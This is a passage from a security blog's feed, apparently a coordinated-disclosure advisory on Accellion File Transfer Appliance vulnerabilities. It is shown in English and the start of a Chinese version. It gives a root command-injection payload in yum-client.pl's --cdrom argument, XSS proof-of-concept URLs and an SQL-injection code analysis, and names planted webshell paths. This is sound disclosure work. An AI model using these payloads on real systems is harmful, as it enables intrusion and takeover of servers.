  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop $cdrom $cdrom_path&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;unable to mount: $!&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After taking a closer look on &lt;code class=&quot;highlighter-rouge&quot;&gt;ymm-client.pl&lt;/code&gt;, a Command Injection vulnerability was found on the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt;. This vulnerability enables attackers to inject any commands into the parameter and execute as root.&lt;/p&gt;

&lt;p&gt;Thus, using the commands below&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo /usr/local/bin/yum-client.pl --cdrom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$(id &amp;gt; /tmp/.gg)&amp;#39;&lt;/span&gt;

mount: can&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;will grant execution freely as root!  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;backdoor&quot;&gt;Backdoor&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niara’s &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Accellion File Transfer Appliance Vulnerability&lt;/a&gt;.  &lt;br /&gt;
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.&lt;/p&gt;

&lt;p&gt;One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The other is WSO, found on 9 of the online hosts globally, placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article “&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt;”.  &lt;br /&gt;
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Feb  6, 2016 05:21 Contact Accellion for vulnerability report&lt;/li&gt;
  &lt;li&gt;Feb  7, 2016 12:35 Send the report to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40&lt;/li&gt;
  &lt;li&gt;May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion&lt;/li&gt;
  &lt;li&gt;Jun  6, 2016 10:20 Advisory finalized by mutual consent&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Accellion File Transfer Appliance 弱點報告</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;accellion-fta-介紹&quot;&gt;Accellion FTA 介紹&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Accellion File Transfer Appliance (以下簡稱 FTA) 為一款安全檔案傳輸服務，可讓使用者線上分享、同步檔案，且所有檔案皆經 AES 128/256 加密，Enterprise 版本更支援 SSL VPN 服務並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制。&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;漏洞描述&quot;&gt;漏洞描述&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
在研究過程中，於 FTA 版本 FTA_9_12_0 (13-Oct-2015 Release) 上，發現了下列弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以上弱點可使不需經過認證的攻擊者，成功遠端攻擊 FTA 伺服器並取得最高權限，當攻擊者完全控制伺服器後，可取得伺服器上的加密檔案與用戶資料等。&lt;/p&gt;

&lt;p&gt;弱點經回報 CERT/CC 後取得共四個獨立 CVE 編號 (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)。&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;影響範圍&quot;&gt;影響範圍&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
根據公開資料掃描，全球共發現 1217 台 FTA 存活主機，主要分布地點為美國，其次加拿大、澳洲、英國與新加坡。根據存活主機的域名、SSL Certificate 發現 FTA 使用客戶遍及政府、教育、企業等領域，其中不乏一些知名品牌。&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞分析與利用&quot;&gt;漏洞分析與利用&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;&lt;br /&gt;
?f2=’-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;&lt;br /&gt;
?documentname=”onerror=”prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;&lt;br /&gt;
?msg=ssologout&lt;br /&gt;&lt;br /&gt;
&amp;amp;loginurl=”&amp;gt;&amp;lt;svg/onload=”prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;經過代碼審查後，在 FTA 中發現一個不須驗證的 SQL Injection，這使得惡意使用者可透過 SQL Injection 存取伺服器的敏感檔案及個人資料，並配合權限設定問題導致遠端代碼執行。問題出在 security_key2.api 中所呼叫到的 &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; 函數中！&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_username&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;opendb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$client_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_username&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$client_id&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;$password&lt;/code&gt; 皆為攻擊者可控參數，雖然有個 &lt;code class=&quot;highlighter-rouge&quot;&gt;_decrypt( ... )&lt;/code&gt; 函數對密碼進行處理，但是與弱點觸發並無相關。其中要注意是 &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; 的值會被代入成全域變數，代表當前使用的 Application ID，並且在 &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; 使用，其中在 &lt;code class=&quot;highlighter-rouge&quot;&gt;opendb( )&lt;/code&gt; 內有以下代碼：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DB_MASTER&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$g_app_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql_select_db&lt;/code&gt; 中所開啟資料庫的名稱由使用者可控，如給錯誤的值將導致程式無法繼續執行下去，所以必須將 &lt;code class=&quot;highlighter-rouge&quot;&gt;$g_app_id&lt;/code&gt; 偽造成正確的內容。&lt;/p&gt;

&lt;p&gt;接著是最主要的函數 &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( $client_id )&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;client_properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_by&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$order_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$limit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.* FROM t_mail_server &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;SELECT t_mail_server.*, t_profile.c_flag as profile_flag FROM t_mail_server, t_profile &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;client_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysql_escape_like&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;manager&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;user_status&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$user_status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fatal_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;exec:mysql_query(&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;) respond:&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;221&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$exclude_del&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
